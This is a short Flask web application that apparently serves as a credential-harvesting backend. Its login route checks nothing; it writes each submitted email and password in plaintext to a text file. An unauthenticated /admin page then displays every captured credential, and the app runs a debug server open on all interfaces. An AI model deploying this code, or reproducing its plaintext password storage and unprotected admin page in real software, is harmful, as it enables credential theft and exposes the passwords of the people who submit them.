from flask import Flask, render_template, request, redirect, url_for
import os

app = Flask(__name__)

# File to store user data (email, password)
data_file = 'data.txt'

@app.route('/')
def index():
    return render_template('index.html')  # This should work if the file is in the templates folder

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    # Store the user's email and password (in a text file for simplicity)
    with open(data_file, 'a') as file:
        file.write(f"Email: {email}, Password: {password}\n")
    
    return redirect(url_for('admin'))

@app.route('/admin')
def admin():
    # Read stored user data
    with open(data_file, 'r') as file:
        data = file.readlines()
    
    return render_template('admin.html', data=data)

if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0", port=5000)


